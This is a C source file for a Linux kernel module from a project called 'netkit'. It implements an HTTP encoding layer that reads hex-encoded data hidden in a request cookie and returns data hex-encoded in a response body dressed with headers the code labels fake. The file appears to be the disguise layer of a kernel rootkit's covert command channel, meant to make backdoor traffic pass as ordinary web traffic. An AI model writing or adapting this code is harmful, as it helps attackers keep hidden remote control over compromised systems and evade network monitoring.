#include <linux/types.h>
#include <linux/string.h>
#include <linux/base64.h>

#include "../../netkit.h"
#include "../../sys/crypto.h"
#include "../../sys/mem.h"

#include "http.h"

#define SEARCH_STRING CONFIG_PIPELINE_HTTP_COOKIE_NAME "="

#define HTTP_STAT_OK_NAME "200 OK"
#define HTTP_STAT_NOCONT_NAME "204 No Content"
#define HTTP_STAT_UNPROC_NAME "422 Unprocessable Content"
#define HTTP_STAT_INTLERR_NAME "500 Internal Server Error"

#define HTTP_PROTO "HTTP/1.1"
#define HTTP_FAKE_HEADERS_EMPTY "Vary: origin\r\n" \
                        "Access-Control-Allow-Credentials: true\r\n" \
                        "Access-Control-Allow-Methods: GET\r\n" \
                        "Access-Control-Allow-Headers: authorization\r\n" \
                        "Content-Type: text/html\r\n" \
                        "Server: ESF\r\n" \
                        "Content-Length: 0\r\n" \
                        "X-Xss-Protection: 0\r\n" \
                        "X-Frame-Options: SAMEORIGIN\r\n" \
                        "X-Content-Type-Options: nosniff\r\n"
#define HTTP_FAKE_HEADERS_DYN_PRE "Vary: origin\r\n" \
                        "Access-Control-Allow-Credentials: true\r\n" \
                        "Access-Control-Allow-Methods: GET\r\n" \
                        "Access-Control-Allow-Headers: authorization\r\n" \
                        "Content-Type: text/html\r\n" \
                        "Server: ESF\r\n" \
                        "Content-Length: "
#define HTTP_FAKE_HEADERS_DYN_POST "\r\n" \
                        "X-Xss-Protection: 0\r\n" \
                        "X-Frame-Options: SAMEORIGIN\r\n" \
                        "X-Content-Type-Options: nosniff\r\n"

#define HTTP_RES(name, cookie_hdr)  HTTP_PROTO " " name "\r\n" \
                        HTTP_FAKE_HEADERS_EMPTY \
                        cookie_hdr\
                        "\r"

#define HTTP_RES_NOCONT HTTP_RES(HTTP_STAT_NOCONT_NAME, "")
#define HTTP_RES_UNPROC HTTP_RES(HTTP_STAT_UNPROC_NAME, "")
#define HTTP_RES_INTLERR HTTP_RES(HTTP_STAT_INTLERR_NAME, "")

// split up cookie hdr, because sprintf has length limitations. instead use strcat
#define HTTP_COOKIE_HDR_PRE "Set-Cookie: " CONFIG_PIPELINE_HTTP_COOKIE_NAME "="
#define HTTP_COOKIE_HDR_POST "; expires=Sun, 25-Aug-2024 20:12:26 GMT; path=/; Secure; HttpOnly; priority=high\r\n"

// transmit it as body, since header has a short length (8kb or so)
#define HTTP_RES_OK_PRE_HEADERS HTTP_PROTO " " HTTP_STAT_OK_NAME "\r\n" \
                        HTTP_FAKE_HEADERS_DYN_PRE "\r\n"
#define HTTP_RES_OK_POST "\r"

enum {
    HTTP_STAT_OK = 200,
    HTTP_STAT_NOCONT = 204,
    HTTP_STAT_UNPROC = 422,
    HTTP_STAT_INTLERR = 500
};

static int set_http_simple(const char *res_content, u8 **res_buf, size_t *res_buflen)
{
    int retv;

    *res_buflen = strlen(res_content);
    *res_buf = kzmalloc(*res_buflen, GFP_KERNEL);
    if (IS_ERR(*res_buf))
    {
        retv = PTR_ERR(*res_buf);
        *res_buf = NULL;
        *res_buflen = 0;
        return retv;
    }

    memcpy(*res_buf, res_content, *res_buflen);

    return 0;
}

static int set_http_ok(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    u8 *encoded_buf;
    size_t encoded_buflen;
    int retv;
    size_t http_body_len;
    char http_body_len_str[21]; // len(str(2**64-1)) + nullbyte

    retv = hex_encode(req_buf, req_buflen, &encoded_buf, &encoded_buflen);
    if (retv < 0)
        return retv;

    http_body_len = encoded_buflen;
    sprintf(http_body_len_str, "%lu", http_body_len);

    // +2 bcs of the extra \r\n
    *res_buflen = strlen(HTTP_PROTO " " HTTP_STAT_OK_NAME "\r\n" HTTP_FAKE_HEADERS_DYN_PRE "\r\n") \
        + strlen(http_body_len_str) + strlen(HTTP_FAKE_HEADERS_DYN_POST) + encoded_buflen + 2;
    *res_buf = kzmalloc(*res_buflen, GFP_KERNEL);
    if (IS_ERR(*res_buf))
    {
        retv = PTR_ERR(*res_buf);
        *res_buf = NULL;
        *res_buflen = 0;

        return retv;
    }

    strcat(*res_buf, HTTP_PROTO " " HTTP_STAT_OK_NAME "\r\n" HTTP_FAKE_HEADERS_DYN_PRE);
    strcat(*res_buf, http_body_len_str);
    strcat(*res_buf, HTTP_FAKE_HEADERS_DYN_POST "\r\n");
    strncat(*res_buf, encoded_buf, encoded_buflen);  // no nullbyte at end
    strcat(*res_buf, "\r");
    
    kzfree(encoded_buf, encoded_buflen); 
    
    (*res_buf)[*res_buflen-1] = '\n';

    return 0;
}

static int layer_http_decode(u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    char *search_start;
    char *cookie_start;
    size_t cookie_size;
    int retv;

    search_start = strnstr(req_buf, SEARCH_STRING, req_buflen);
    if (search_start == NULL)
    {
        retv = -EINVAL;
        goto LAB_OUT;
    }

    cookie_start = search_start + strlen(SEARCH_STRING);

    // strchr but with multiple chars, and stop when buflen is met
    for (cookie_size = 0; (void*)(cookie_start + cookie_size) < (void*)(req_buf + req_buflen) && IS_HEX(cookie_start[cookie_size]); cookie_size++);

    retv = hex_decode(cookie_start, cookie_size, res_buf, res_buflen);

LAB_OUT:
    kzfree(req_buf, req_buflen);

    if (retv < 0)
        return retv;

    return 0;
}

static int layer_http_encode(u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    int retv;

    if (req_buflen == 0)
        return set_http_simple(HTTP_RES_NOCONT, res_buf, res_buflen);

    retv = set_http_ok(req_buf, req_buflen, res_buf, res_buflen);
    kzfree(req_buf, req_buflen);

    return retv;
}

static int layer_http_handle_err(int retv, u8 **res_buf, size_t *res_buflen)
{
    //if (retv == -EINVAL)
    //    return set_http_simple(HTTP_RES_UNPROC, res_buf, res_buflen);

    return set_http_simple(HTTP_RES_UNPROC, res_buf, res_buflen);
}


const struct pipeline_ops LAYER_HTTP_OPS = {
    .decode = layer_http_decode, 
    .encode = layer_http_encode, 
    .handle_err = layer_http_handle_err
};
